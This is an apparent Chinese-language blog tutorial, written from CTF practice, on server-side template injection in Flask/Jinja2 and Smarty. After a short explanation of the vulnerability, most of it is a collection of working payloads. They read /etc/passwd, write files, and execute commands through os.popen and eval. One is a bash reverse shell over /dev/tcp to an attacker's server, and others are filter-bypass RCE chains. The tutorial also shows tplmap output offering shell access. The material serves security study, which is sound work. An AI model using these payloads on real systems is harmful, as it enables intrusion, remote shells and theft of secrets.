## 一文了解SSTI和所有常见payload 以flask模板为例

**前言**

做的ctf题里有好几道跟SSTI有关 故对SSTI进行学习 在此做个小结与记录

主要是flask模板 后面遇到别的模板再陆续记录

### **1、什么是SSTI**

SSTI，服务器端模板注入(Server-Side Template Injection)

- 服务端接收攻击者的输入，将其作为Web应用模板内容的一部分
- 在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容
- 从而导致信息泄露、代码执行、GetShell等问题
- 其影响范围主要取决于模版引擎的复杂性

注意：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入

主要的框架

- Python：jinja2、 mako、 tornado、 django
- php：smarty、 twig
- java：jade、 velocity

### **2、基础知识**

##### **模板引擎**

模板引擎是以业务逻辑层和表现层分离为目的的，将规定格式的模板代码转换为业务数据的算法实现

也就是说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

![](https://ask.qcloudimg.com/http-save/yehe-8581257/62c3d3043cb8cf7640eb0fe45b1c8e26.png)

但是新的模板引擎往往会有一些安全问题 , 即使大部分模板引擎有提供沙箱隔离机制 , 但同样存在沙箱逃逸技术来绕过

##### **页面渲染**

页面渲染

- 前端渲染( SPA , 单页面应用 ) 浏览器从服务器得到一些信息( 可能是 JSON 等各种数据交换格式所封装的数据包 , 也可能是合法的 HTML 字符串 ) 浏览器将这些信息排列组合成人类可读的 HTML 字符串 . 然后解析为最终的 HTML 页面呈现给用户 整个过程都是由客户端浏览器完成的 , 因此对服务器后端的压力较小 , 仅需要传输数据即可
- 后端渲染( SSR , [服务器渲染](https://cloud.tencent.com/solution/render?from_column=20065&from=20065) ) 浏览器会直接接收到经过服务器计算并排列组合后的 HTML 字符串 , 浏览器仅需要将字符串解析为呈现给用户的 HTML 页面就可以了 . 整个过程都是由服务器完成的 , 因此对客户端浏览器的压力较小 , 大部分任务都在服务器端完成了 , 浏览器仅需要解析并呈现 HTML 页面即可

参考后端渲染html、前端模板渲染html，jquery的html，各有什么区别？

### **3、flask模板**

看得资料和做的题好多都是flask相关 所以下面的内容以 Flask 框架为例( Flask 使用 Jinja2 作为模板引擎)

##### **环境搭建**

Pycharm 内置的 Flask 框架

![](https://ask.qcloudimg.com/http-save/yehe-8581257/0094adff658ad0825edd068c882aa6e7.png)

http://127.0.0.1:5000可见到欢迎界面

![](https://ask.qcloudimg.com/http-save/yehe-8581257/9364ecb0f1f36a7248a3e2f9959d1a91.png)

在 Run/Debug Configuration 中配置 DEBUG 模式

![](https://ask.qcloudimg.com/http-save/yehe-8581257/a6f30ddea1adf96fac8885783594f7f8.png)

这样每次修改源文件后 , 仅需要保存并且刷新页面就可以看到内容更新了

注意：实际运行环境时是不可开启 DEBUG 模式的 , 非常危险

##### **渲染方法**

Flask 中的渲染方法有两种 : `render_template()` 和 `render_template_string()`

- `render_template()` 函数 渲染一个指定的文件 , 这个指定的文件其实就是模板

![](https://ask.qcloudimg.com/http-save/yehe-8581257/7b9565ad3ea548c5fcf27946a4e52163.png)

![](https://ask.qcloudimg.com/http-save/yehe-8581257/af3c73628b4a08dc2260eb66cf9b96ce.png)

![](https://ask.qcloudimg.com/http-save/yehe-8581257/476ad523749feb4c400786ece4880860.png)

- `render_template_string()` 函数 渲染一个字符串

![](https://ask.qcloudimg.com/http-save/yehe-8581257/5a65b5230e5c1dff5354029129111623.png)

![](https://ask.qcloudimg.com/http-save/yehe-8581257/8ac589a8605a7e540cf93b58495bf03e.png)

注：SSTI与`render_template_string()`函数密不可分

### **4、SSTI原理**

一个最简单的例子

```javascript
@app.route('/test')
def test():
    html = '{{12*12}}'
    return flask.render_template_string(html)

```

![](https://ask.qcloudimg.com/http-save/yehe-8581257/39df0df74597b45a0e24bc521875a437.png)

发现`{{ --- }}`其中的语句被执行了

- 这是因为在flask中，渲染引擎Jinja2会将`{{ --- }}`视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行
- 那么，在上一段代码中，如果我们传入的参数内容为`{{ --- }}`包裹的代码，这些代码就会被执行

##### **沙箱逃逸**

在上述例子中，虽然已经可以实现任意代码执行，但由于模板本身的沙盒安全机制，某些语句虽然可以执行，却不会执行成功

![](https://ask.qcloudimg.com/http-save/yehe-8581257/38cb12c26e49b5678b9c682fc2f9548c.png)

即使在服务器端将os包含进来，但是在渲染时仍然会出现这个错误，这就是因为沙盒机制严格地限制了程序的行为

沙箱逃逸的过程简单讲如下

![](https://ask.qcloudimg.com/http-save/yehe-8581257/eb3b14325cb6de4c69ef852c3affd370.png)

借助的主要是各个类之间的继承关系 一些内建魔术方法如下

![](https://ask.qcloudimg.com/http-save/yehe-8581257/57cb60bdd4b40d3f8b25ee1ea027ad65.png)

- `__class__`：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。

```javascript
>>> ''.__class__
<type 'str'>
>>> ().__class__
<type 'tuple'>
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'>
```

- `__bases__`：用来查看类的基类，也可是使用数组索引来查看特定位置的值

```javascript
>>> ().__class__.__bases__
(<type 'object'>,)
>>> ''.__class__.__bases__
(<type 'basestring'>,)
>>> [].__class__.__bases__
(<type 'object'>,)
>>> {}.__class__.__bases__
(<type 'object'>,)
>>> [].__class__.__bases__[0]
<type 'object'>
```

- `__mro__`：也可以获取基类

```javascript
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> [].__class__.__mro__
(<class 'list'>, <class 'object'>)
>>> {}.__class__.__mro__
(<class 'dict'>, <class 'object'>)
>>> ().__class__.__mro__
(<class 'tuple'>, <class 'object'>)
>>> ().__class__.__mro__[1]            # 使用索引就能获取基类了
<class 'object'>
```

SSTI主要就是活用各种魔术方法

### **5、引擎判断**

服务端使用的各种引擎支持的语法是不同的 所以在找到SSTI注入点之后，首先应当判断模板所使用的渲染引擎

通常可以使用以下payload来简单测试：

![](https://ask.qcloudimg.com/http-save/yehe-8581257/e9ec13d2c3c3a067e54d4670c0392367.png)

绿色为执行成功，红色为执行失败 另：`{{7*'7'}}`在Twig中返回`49`，在Jinja2中返回`77777777`

### **6、SSTI利用**

一些SSTI的利用方法

##### **XSS**

![](https://ask.qcloudimg.com/http-save/yehe-8581257/183818089cbcfaebaa8530e26755baa6.png)

以 GET 方式从 URL 处获取 code 参数的值 , 然后将它输出到页面 .

这段代码非常容易看出来存在安全隐患 . 后端没有对用户输入的内容进行过滤 , 就直接将它输出到页面 输入端是完全可控的 . 这就产生了代码域与数据域的混淆

![](https://ask.qcloudimg.com/http-save/yehe-8581257/d365f73c989235a7b2e272a714c28433.png)

##### **任意文件读写**

这里就要用到上面所说的魔术方法了

![](https://ask.qcloudimg.com/http-save/yehe-8581257/183818089cbcfaebaa8530e26755baa6.png)

仍然是上面这个源码

- 获取字符串的类对象

```javascript
>>> ''.__class__
<type 'str'>

```

- 寻找基类

```javascript
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)

```

- 寻找可用引用

```javascript
>>> ''.__class__.__mro__[2].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```

可以看到有一个`<type 'file'>`

- 最终payload

```javascript
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
```

也可以是

```javascript
()..__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
object.__subclasses__()[40]('/etc/passwd').read()
```

写文件相仿

```javascript
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
().__class__.__bases__[0].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
object.__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
```

##### **任意代码执行**

思路和任意文件读取非常类似 , 仅需要拿到 os 模块就可以了 可用payload如下

```javascript
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()

# eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
object.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )

#__import__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

##### **反弹shell**

```javascript
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/你的服务器地址/端口 0>&1').read()
```

这个 Payload 不能直接放在 URL 中执行 , 因为 `&` 的存在会导致 URL 解析出现错误 可以使用 BurpSuite 等工具构造数据包再发送

![](https://ask.qcloudimg.com/http-save/yehe-8581257/2a7321a2aee82c4f143e92ebf5bb70a9.png)

##### **其他**

- `request.environ` 一个与服务器环境相关的对象字典 . 访问该字典可以拿到很多你期待的信息

![](https://ask.qcloudimg.com/http-save/yehe-8581257/3bd78a4499adaf9d23080bdc602f42f4.png)

- `config.items` 一个类字典的对象 , 包含了所有应用程序的配置值 在大多数情况下 , 它包含了比如[数据库](https://cloud.tencent.com/solution/database?from_column=20065&from=20065)链接字符串 , 连接到第三方的凭证 , SECRET_KEY等敏感值

![](https://ask.qcloudimg.com/http-save/yehe-8581257/5f234f37d492857f605d0530b3c3f196.png)

- 一个小脚本

```javascript
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}         //poppen的参数就是要执行的命令
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

### **7、一些绕过**

对一些过滤的绕过方法

##### **过滤了小括号**

用python的内置函数

- get_flashed_messages()
- url_for()

payload

```javascript
{{url_for.__globals__}}
{{url_for.__globals__['current_app'].config['FLAG']}}

{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

##### **过滤了 `class`、 `subclasses`、 `read`等关键词**

用request

- GET: request.args
- Cookies: request.cookies
- Headers: request.headers
- Environment: request.environ
- Values: request.values

一些用法

- `request.__class__`
- `request["__class__"]`
- `request|attr("__class__")`

payload

```javascript
{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&b=__mro__&c=__subclasses__
```

##### **过滤了下划线`_`**

payload

```javascript
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
```

其实现过程如下

```javascript
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

##### **过滤了中括号`[`和`]`**

payload

```javascript
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

##### **过滤了`|join`**

用`|format` payload

```javascript
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

##### **无敌绕过的最终RCE**

绕过`[`，`]`检查，但不绕过`__`检查 使用该`set`函数来访问必需的`object（i）`类 `pop()`将检索file对象，然后使用我们的已知参数调用该对象 与初始RCE相似，这将创建一个python文件`/tmp/foo.py`并执行`print 1337`有效负载

```javascript
{%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
```

绕过所有黑名单检查的最终RCE （真牛逼）

```javascript
{%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=class&mro=mro&subc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+1337
```

### **8、神器tplmap**

github 需要环境：PyYaml

例子

```javascript
root@kali:/mnt/hgfs/共享文件夹/tplmap-master# python tplmap.py -u "http://192.168.1.10:8000/?name=Sea"                             //判断是否是注入点
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name                //说明可以注入，同时给出了详细信息
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok           //检验出这些利用方法对于目标环境是否可用
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:
                                                                  //可以利用下面这些参数进行进一步的操作
    --os-shell        Run shell on the target
    --os-cmd        Execute shell commands
    --bind-shell PORT      Connect to a shell bind to a target port
    --reverse-shell HOST PORT  Send a shell back to the attacker's port
    --upload LOCAL REMOTE  Upload files to the server
    --download REMOTE LOCAL  Download remote files
```

### **9、smarty SSTI**

smarty是基于PHP开发的，官方文档 于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别

注入点：

- XFF
- Client IP

确认漏洞：

- 输入`{$smarty.version}`，返回smarty的版本号

##### **`{php}{/php}`标签**

Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令

```javascript
{php}phpinfo();{/php}
```

但在Smarty3的官方手册里有以下描述：

- Smarty已经废弃{php}标签，强烈建议不要使用
- 在Smarty 3.1，`{php}`仅在SmartyBC中可用

##### **`{literal}`标签**

官方手册这样描述这个标签：

- `{literal}`可以让一个模板区域的字符原样输出
- 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析

在php5的环境中可以使用

```javascript
<script language="php">phpinfo();</script>
```

php7就不能用了

##### **静态方法**

通过self获取Smarty类再调用其静态方法实现文件读写

Smarty类的getStreamVariable方法的代码

```javascript
public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
```

这个方法可以读取一个文件并返回其内容 所以我们可以用self来获取Smarty对象并调用这个方法 很多文章里给的payload都形如：

```javascript
{self::getStreamVariable("file:///etc/passwd")}
```

但在3.1.30的Smarty版本中官方已经把该静态方法删除

##### **`{if}`标签**

官方文档中的描述：

- Smarty的`{if}`条件判断和PHP的if非常相似，只是增加了一些特性
- 每个`{if}`必须有一个配对的`{/if}`，也可以使用`{else}` 和 `{elseif}`
- 全部的PHP条件表达式和函数都可以在if内使用，如`||`, `or`, `&&`, `and,` `is_array(),` 等等，如：`{if is_array($array)}{/if}`

payload

```javascript
{if phpinfo()}{/if}
```